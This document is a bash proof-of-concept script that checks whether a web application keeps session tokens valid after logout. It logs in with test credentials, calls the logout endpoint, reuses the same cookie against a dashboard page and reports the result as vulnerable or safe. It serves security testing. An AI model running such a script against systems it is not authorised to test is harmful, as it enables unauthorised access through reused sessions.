#!/bin/bash

# POC: Session Invalidation Failure
# Demonstrates that session tokens remain valid after logout
# allowing continued access to protected resources

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-80}"
BASE_URL="http://${TARGET_HOST}:${TARGET_PORT}"

echo "=========================================="
echo "POC: Session Invalidation Failure"
echo "=========================================="
echo "Target: $BASE_URL"
echo ""

# Step 1: Login and obtain session token
echo "[*] Step 1: Logging in to obtain session token..."
LOGIN_RESPONSE=$(curl -s -c /tmp/cookies.txt -X POST "$BASE_URL/login" \
  -d "username=test&password=test" \
  -H "Content-Type: application/x-www-form-urlencoded")

# Extract session token from response or cookies
SESSION_TOKEN=$(grep -oP 'session=\K[^;]+' /tmp/cookies.txt 2>/dev/null || echo "")

if [ -z "$SESSION_TOKEN" ]; then
  # Try extracting from response headers
  SESSION_TOKEN=$(echo "$LOGIN_RESPONSE" | grep -oP 'session=\K[^;]+' | head -1)
fi

if [ -z "$SESSION_TOKEN" ]; then
  echo "[-] Failed to extract session token. Checking cookies..."
  SESSION_TOKEN=$(curl -s -c /tmp/cookies.txt -X POST "$BASE_URL/login" \
    -d "username=test&password=test" \
    -w "\n%{http_code}" | tail -1)
  SESSION_TOKEN=$(grep "session" /tmp/cookies.txt | awk '{print $7}')
fi

echo "[+] Session token obtained: $SESSION_TOKEN"
echo ""

# Step 2: Verify session works before logout
echo "[*] Step 2: Verifying session works before logout..."
DASHBOARD_BEFORE=$(curl -s -b "session=$SESSION_TOKEN" "$BASE_URL/dashboard")
STATUS_BEFORE=$(curl -s -o /dev/null -w "%{http_code}" -b "session=$SESSION_TOKEN" "$BASE_URL/dashboard")

echo "[+] Dashboard HTTP Status before logout: $STATUS_BEFORE"
if [[ "$DASHBOARD_BEFORE" == *"Dashboard"* ]] || [[ "$DASHBOARD_BEFORE" == *"dashboard"* ]] || [[ "$STATUS_BEFORE" == "200" ]]; then
  echo "[+] Session valid - can access dashboard before logout"
else
  echo "[-] Could not verify dashboard access, continuing with logout test..."
fi
echo ""

# Step 3: Call logout endpoint
echo "[*] Step 3: Calling logout endpoint..."
LOGOUT_RESPONSE=$(curl -s -i -b "session=$SESSION_TOKEN" "$BASE_URL/logout")
LOGOUT_STATUS=$(echo "$LOGOUT_RESPONSE" | grep -oP 'HTTP/[0-9.]+ \K[0-9]+' | head -1)

echo "[+] Logout response status: $LOGOUT_STATUS"
echo "[+] Logout response headers:"
echo "$LOGOUT_RESPONSE" | head -20
echo ""

# Step 4: Attempt to access protected resource with same session token
echo "[*] Step 4: Attempting to access dashboard AFTER logout..."
echo "[*] Using same session token: $SESSION_TOKEN"
echo ""

# Multiple attempts to confirm persistence
for attempt in 1 2 3; do
  DASHBOARD_AFTER=$(curl -s -b "session=$SESSION_TOKEN" "$BASE_URL/dashboard")
  STATUS_AFTER=$(curl -s -o /dev/null -w "%{http_code}" -b "session=$SESSION_TOKEN" "$BASE_URL/dashboard")
  
  echo "[*] Attempt $attempt:"
  echo "    HTTP Status: $STATUS_AFTER"
  
  if [[ "$STATUS_AFTER" == "200" ]]; then
    if [[ "$DASHBOARD_AFTER" == *"Dashboard"* ]] || [[ "$DASHBOARD_AFTER" == *"dashboard"* ]] || [[ "$DASHBOARD_AFTER" == *"username"* ]]; then
      echo "    [VULNERABLE] Session still valid - can access dashboard after logout!"
      VULNERABLE=1
    else
      echo "    [?] HTTP 200 but unclear if dashboard is accessible"
    fi
  elif [[ "$STATUS_AFTER" == "401" ]] || [[ "$STATUS_AFTER" == "302" ]] || [[ "$STATUS_AFTER" == "303" ]]; then
    echo "    [SAFE] Session properly invalidated (HTTP $STATUS_AFTER)"
  else
    echo "    [?] Unexpected status code"
  fi
done
echo ""

# Step 5: Check if Set-Cookie header has proper expiration
echo "[*] Step 5: Checking Set-Cookie headers on logout..."
COOKIE_HEADERS=$(echo "$LOGOUT_RESPONSE" | grep -i "Set-Cookie" || echo "No Set-Cookie headers found")
echo "$COOKIE_HEADERS"
echo ""

# Verdict
echo "=========================================="
echo "VULNERABILITY ASSESSMENT:"
echo "=========================================="
if [[ "$VULNERABLE" == "1" ]]; then
  echo "[!] CRITICAL: Session token remains valid after logout!"
  echo "[!] An attacker with the session token can continue accessing protected resources"
  exit 0  # Exit with success to indicate vulnerability confirmed
else
  echo "[*] Session appears to be properly invalidated"
  exit 1  # Exit with failure if not vulnerable
fi